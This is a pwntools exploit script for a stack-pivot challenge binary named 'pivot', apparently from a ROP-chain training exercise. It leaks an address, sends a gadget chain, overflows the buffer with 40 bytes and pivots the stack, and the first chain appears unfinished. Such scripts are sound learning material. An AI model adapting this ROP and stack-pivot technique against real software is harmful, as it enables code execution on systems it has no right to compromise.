from pwn import *

elf = context.binary = ELF("pivot")
p = process(elf.path)

# To automatically open GDB in separate terminal, uncomment the next 2 lines
# context.terminal = ('xfce4-terminal', '-e')
# gdb.attach(p)

p.recvuntil(': ')

pivot_addr = p.recvuntil('\n', drop=True)
print(pivot_addr)
pivot_addr = pivot_addr.split(b"x")[1].strip()
pivot_addr = int(pivot_addr, 16)
pivot_addr = p64(pivot_addr)
print(pivot_addr.hex())
p.recvuntil('> ')

FOOTHOLD_FUNC = 0x400720
POP_RDI_RET = 0x400a33
PUTS = 0x4006e0
MOV_RAX_PTR_RAX_RET = 0x4009c0
FOOTHOLD_FUNC_GOT_PLT_ADDR = 0x601040
JMP_QWORDPTR_RAX = 0x400c23

payload_1 = p64(POP_RDI_RET)
payload_1 += p64(0x400ac8)
payload_1 += p64(PUTS)
payload_1 += p64(POP_RDI_RET)
payload_1 += p64(0x400ac8)
payload_1 += p64(PUTS)



# payload_1 = p64(FUNC)
p.sendline(payload_1)
# pause()

POP_RAX_RET = 0x4009bb
XCHG_RSP_RAX_RET = 0x4009bd

p.recvuntil('> ')

payload_2 = b'A' * 40
payload_2 += p64(POP_RAX_RET)
payload_2 += pivot_addr
payload_2 += p64(XCHG_RSP_RAX_RET)


p.sendline(payload_2)
# pause()
p.interactive() 
